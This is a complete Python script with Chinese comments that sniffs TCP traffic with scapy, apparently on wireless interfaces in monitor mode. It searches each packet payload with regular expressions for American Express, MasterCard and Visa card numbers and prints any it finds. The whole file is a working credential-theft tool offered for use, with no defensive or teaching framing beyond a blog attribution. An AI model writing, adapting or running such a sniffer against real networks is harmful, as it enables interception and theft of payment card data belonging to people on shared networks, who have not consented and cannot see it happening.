#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/19
# Created by 冰河
# Description 嗅探无线数据包中的信用卡信息，注意：要先将网卡设置为监听模式
# 博客 https://blog.csdn.net/l1028386804

import re
import optparse
from scapy.all import *

#查询数据包中的信用卡信息
def findCreditCard(pkt):
    #把载荷中的二进制内容复制到raw中
    raw = pkt.sprintf('%Raw.load%')
    americaRE = re.findall("3[47][0-9]{13}", raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

    if americaRE:
        print("[+] Found American Express Card: " + americaRE[0])

    if masterRE:
        print('[+] Found MasterCard Card: ' + masterRE[0])

    if visaRE:
        print('[+] Found Visa Card: ' + visaRE[0])

def main():
    parser = optparse.OptionParser('usage % prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    if options.interface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        print('[*] Starting Credit Card Sniffer.')
        #过滤TCP数据包，把抓到的每个TCP包作为一个参数传递给findCreditCard()
        sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()